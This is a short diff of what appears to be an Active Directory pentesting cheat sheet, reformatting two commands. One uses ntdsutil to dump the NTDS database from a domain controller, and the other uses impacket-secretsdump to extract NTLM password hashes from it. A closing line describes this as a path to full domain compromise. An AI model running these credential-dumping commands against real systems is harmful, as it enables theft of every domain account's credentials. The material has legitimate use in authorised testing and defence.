@@ -49,9 +49,9 @@
 
 ### NTDSUtil
 
- - ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q (On the DC)
+    ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q (On the DC)
 
- - impacket-secretsdump -ntds NTDS_FILE.dit -system SYSTEM_FILE -hashes LMHASH:NTHASH LOCAL -outputfile ntlm-extract
+    impacket-secretsdump -ntds NTDS_FILE.dit -system SYSTEM_FILE -hashes LMHASH:NTHASH LOCAL -outputfile ntlm-extract
 
 ### With these techniques you can move everywhere within the entire domain, as well as possibly compromise the Enterprise Admin (in this case it's game over)
 
